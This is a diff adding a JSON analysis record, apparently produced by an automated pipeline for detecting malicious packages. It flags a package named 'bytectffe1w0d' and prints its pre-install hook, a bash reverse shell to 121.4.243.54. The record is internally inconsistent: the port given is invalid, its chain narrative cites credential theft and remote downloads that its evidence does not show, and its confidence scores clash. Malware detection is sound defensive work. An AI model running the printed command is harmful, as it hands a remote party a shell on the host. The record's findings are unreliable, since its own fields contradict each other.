@@ -1,0 +1,54 @@
+{
+  "package_name": "bytectffe1w0d",
+  "version": "0.0.1",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [],
+    "behaviors": [
+      {
+        "category": "backdoor_installation",
+        "summary": "The package contains a backdoor installation script in the pre-install hook.",
+        "details": "The pre-install hook contains a reverse shell command to a known IP address (121.4.243.54) and port (222240).",
+        "confidence": 0.96,
+        "evidence_commands": [
+          "bash-i>&/dev/tcp/121.4.243.54/222240>&1"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": [],
+        "risk_vector": [
+          "backdoor_installation"
+        ]
+      }
+    ],
+    "analyst_note": "This JSON output indicates that the package has a high level of confidence that it contains a backdoor installation script in the pre-install hook. The details of the malicious action taken by the code are provided in the \"details\" field. The command used in the pre-install hook is \"bash-i>&/dev/tcp/121.4.243.54/222240>&1\", which is a reverse shell command to a known IP address and port. The risk vector indicates that the package is involved in backdoor installation."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials, POST to external domain, install hook downloads remote script, executes it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package purpose is not clear, the behaviors do not match the package purpose",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.7,
+      "explanation": "The package contains a backdoor installation script in the pre-install hook, which is a malicious action. The package purpose is not clear, and the detected behaviors do not match the package purpose."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 1.0,
+    "confirmed_signals_count": 3,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:06:15.409255"
+}
